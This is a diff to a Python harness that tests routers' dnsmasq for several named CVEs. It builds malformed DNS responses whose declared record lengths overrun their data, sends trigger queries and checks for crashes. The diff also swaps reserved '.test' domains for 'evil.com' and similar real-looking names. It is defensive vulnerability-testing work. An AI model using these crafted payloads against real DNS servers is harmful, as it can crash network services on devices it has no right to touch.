@@ -157,11 +157,15 @@ class DUTConnection:
         return out.strip()
 
     def get_dnsmasq_version(self):
-        out, _, _ = self.exec("/sbin/dnsmasq --version 2>/dev/null | head -1")
+        out, _, _ = self.exec("dnsmasq --version 2>/dev/null | head -1 || "
+                              "/sbin/dnsmasq --version 2>/dev/null | head -1 || "
+                              "/usr/sbin/dnsmasq --version 2>/dev/null | head -1")
         return out
 
     def get_compile_options(self):
-        out, _, _ = self.exec("/sbin/dnsmasq --version 2>/dev/null | head -5")
+        out, _, _ = self.exec("dnsmasq --version 2>/dev/null | head -5 || "
+                              "/sbin/dnsmasq --version 2>/dev/null | head -5 || "
+                              "/usr/sbin/dnsmasq --version 2>/dev/null | head -5")
         return out
 
     def check_dmesg_crash(self):
@@ -177,17 +181,33 @@ class DUTConnection:
         return out
 
     def restart_dnsmasq(self):
-        """Restart dnsmasq on the DUT."""
-        self.exec("killall dnsmasq 2>/dev/null; sleep 1")
-        self.exec("/etc/init.d/service_dhcp_server/dhcp_server-restart.sh 2>/dev/null "
-                  "|| /etc/init.d/dnsmasq restart 2>/dev/null "
-                  "|| dnsmasq 2>/dev/null")
+        """Restart dnsmasq on the DUT (supports Oak and Pinnacle)."""
+        self.exec("/etc/init.d/dnsmasq restart 2>/dev/null "
+                  "|| /etc/init.d/service_dhcp_server/dhcp_server-restart.sh 2>/dev/null "
+                  "|| (killall dnsmasq 2>/dev/null; sleep 1; dnsmasq 2>/dev/null)")
         time.sleep(2)
 
     def verify_upstream_dns(self, expected_server):
-        """Check if DUT is configured to forward DNS to expected_server (read-only)."""
-        out, _, _ = self.exec("cat /etc/resolv.conf")
-        return expected_server in out
+        """Check if DUT is configured to forward DNS to expected_server (read-only).
+
+        Supports both Oak (resolv.conf-based) and Pinnacle (UCI/noresolv with server= directives).
+        """
+        # Check resolv.conf
+        out, _, _ = self.exec("cat /etc/resolv.conf 2>/dev/null")
+        if expected_server in out:
+            return True
+        # Check dnsmasq config (Pinnacle uses server= directives with noresolv)
+        out, _, _ = self.exec(
+            "cat /var/etc/dnsmasq.conf* /etc/dnsmasq.conf /tmp/dnsmasq.conf 2>/dev/null "
+            "| grep -i server"
+        )
+        if expected_server in out:
+            return True
+        # Check UCI config (OpenWrt/Pinnacle)
+        out, _, _ = self.exec("uci show dhcp 2>/dev/null | grep server")
+        if expected_server in out:
+            return True
+        return False
 
     def close(self):
         if self.client:
@@ -224,7 +244,7 @@ def build_exploit_5172(txid, qname, qtype, qclass):
     ans_ttl = struct.pack("!I", 300)
 
     cname_target = encode_name(
-        "a.very.long.cname.target.that.exceeds.the.declared.rdlen.boundary.evil.test"
+        "a.very.long.cname.target.that.exceeds.the.declared.rdlen.boundary.evil.com"
     )
     # Declare rdlen as 4 bytes but actual data is much longer
     # This makes endrr = p1 + 4, but extract_name advances p1 past endrr
@@ -242,11 +262,11 @@ def build_exploit_5172_v2(txid, qname, qtype, qclass):
     # Answer 1: CNAME pointing somewhere
     ans1_name = struct.pack("!H", 0xC00C)
     ans1 = ans1_name + struct.pack("!HH", 5, 1) + struct.pack("!I", 300)
-    target = encode_name("target.evil.test")
+    target = encode_name("target.evil.com")
     ans1 += struct.pack("!H", len(target)) + target
 
     # Answer 2: A record for target with rdlen=2 but actual 4 bytes of IP
-    ans2_name = encode_name("target.evil.test")
+    ans2_name = encode_name("target.evil.com")
     ans2 = ans2_name + struct.pack("!HH", 1, 1) + struct.pack("!I", 300)
     ans2 += struct.pack("!H", 2)  # rdlen=2, but A record needs 4
     ans2 += socket.inet_aton("6.6.6.6")  # 4 bytes, overruns declared rdlen
@@ -265,7 +285,7 @@ def build_exploit_5172_v3(txid, qname, qtype, qclass):
     ans_ttl = struct.pack("!I", 300)
     # MX rdata: preference(2) + exchange(name)
     mx_pref = struct.pack("!H", 10)
-    mx_exchange = encode_name("mail.very.long.exchange.name.that.overflows.declared.rdlen.evil.test")
+    mx_exchange = encode_name("mail.very.long.exchange.name.that.overflows.declared.rdlen.evil.com")
     mx_rdata = mx_pref + mx_exchange
     # Declare only 6 bytes (2 for pref + 4 for "partial" name)
     ans_rdlen = struct.pack("!H", 6)
@@ -611,16 +631,19 @@ class CVETestRunner:
         self.dut_features["DHCP"] = "DHCP" in version_info and "no-DHCP" not in version_info
 
         # Check for --dhcp-script (needed for CVE-2026-4892)
-        # Oak uses: dhcp-script=/etc/init.d/service_dhcp_server/dnsmasq_dhcp.script
-        out, _, _ = self.dut.exec("cat /etc/dnsmasq.conf 2>/dev/null | grep dhcp-script; "
-                                  "cat /tmp/dnsmasq.conf 2>/dev/null | grep dhcp-script")
-        self.dut_features["dhcp-script"] = "dhcp-script" in out
+        out, _, _ = self.dut.exec(
+            "cat /etc/dnsmasq.conf /var/etc/dnsmasq.conf* /tmp/dnsmasq.conf 2>/dev/null | grep dhcp-script; "
+            "uci get dhcp.@dnsmasq[0].dhcpscript 2>/dev/null"
+        )
+        self.dut_features["dhcp-script"] = "dhcp-script" in out or "dhcpscript" in out or "/" in out
 
         # Check for --add-subnet (needed for CVE-2026-4893)
-        out, _, _ = self.dut.exec("cat /etc/dnsmasq.conf 2>/dev/null | grep add-subnet; "
-                                  "cat /tmp/dnsmasq.conf 2>/dev/null | grep add-subnet; "
-                                  "ps w | grep dnsmasq | grep add-subnet")
-        self.dut_features["add-subnet"] = "add-subnet" in out
+        out, _, _ = self.dut.exec(
+            "cat /etc/dnsmasq.conf /var/etc/dnsmasq.conf* /tmp/dnsmasq.conf 2>/dev/null | grep add-subnet; "
+            "ps w | grep dnsmasq | grep add-subnet; "
+            "uci show dhcp 2>/dev/null | grep add.subnet"
+        )
+        self.dut_features["add-subnet"] = "add-subnet" in out or "add_subnet" in out
 
         # Version
         ver_line = version_info.split("\n")[0] if version_info else "unknown"
@@ -632,7 +655,7 @@ class CVETestRunner:
 
     def _verify_forwarding(self):
         """Send a query through the DUT and check if our server receives it."""
-        test_domain = f"verify-{random.randint(1000,9999)}.test.local"
+        test_domain = f"verify-{random.randint(1000,9999)}.cve-test.com"
         self.dns_server.queries_received = []
         # Send query to DUT
         query, _ = build_dns_query(test_domain)
@@ -791,7 +814,7 @@ class CVETestRunner:
 
         for variant_id, desc in variants:
             self.dns_server.set_exploit(variant_id)
-            domain = f"crash-5172-{random.randint(1000,9999)}.evil.test"
+            domain = f"crash-5172-{random.randint(1000,9999)}.evil.com"
             print(f"      → Variant: {desc} (query: {domain})")
 
             got_response = self._send_trigger_query(domain)
@@ -816,7 +839,7 @@ class CVETestRunner:
     def _test_2291(self, pid_before):
         """CVE-2026-2291: Heap overflow via NAME_ESCAPE in DNSSEC."""
         self.dns_server.set_exploit("CVE-2026-2291")
-        domain = f"crash-2291-{random.randint(1000,9999)}.evil.test"
+        domain = f"crash-2291-{random.randint(1000,9999)}.evil.com"
         print(f"    Sending oversized escaped name (query: {domain})")
 
         got_response = self._send_trigger_query(domain)
@@ -838,7 +861,7 @@ class CVETestRunner:
     def _test_4890(self, pid_before):
         """CVE-2026-4890: NSEC bitmap infinite loop."""
         self.dns_server.set_exploit("CVE-2026-4890")
-        domain = f"crash-4890-{random.randint(1000,9999)}.evil.test"
+        domain = f"crash-4890-{random.randint(1000,9999)}.evil.com"
         print(f"    Sending NSEC bitmap with length=0 (query: {domain})")
 
         got_response = self._send_trigger_query(domain)
@@ -861,7 +884,7 @@ class CVETestRunner:
     def _test_4891(self, pid_before):
         """CVE-2026-4891: RRSIG OOB read."""
         self.dns_server.set_exploit("CVE-2026-4891")
-        domain = f"crash-4891-{random.randint(1000,9999)}.evil.test"
+        domain = f"crash-4891-{random.randint(1000,9999)}.evil.com"
         print(f"    Sending RRSIG with truncated rdlen (query: {domain})")
 
         got_response = self._send_trigger_query(domain)
@@ -984,7 +1007,7 @@ class CVETestRunner:
     def _test_4893(self, pid_before):
         """CVE-2026-4893: ECS check_source validation bypass (logic bug)."""
         self.dns_server.set_exploit("CVE-2026-4893")
-        domain = f"crash-4893-{random.randint(1000,9999)}.evil.test"
+        domain = f"crash-4893-{random.randint(1000,9999)}.evil.com"
         print(f"    Sending query with EDNS Client Subnet (query: {domain})")
 
         # This is a logic bug, not a crash — it passes plen instead of n to check_source
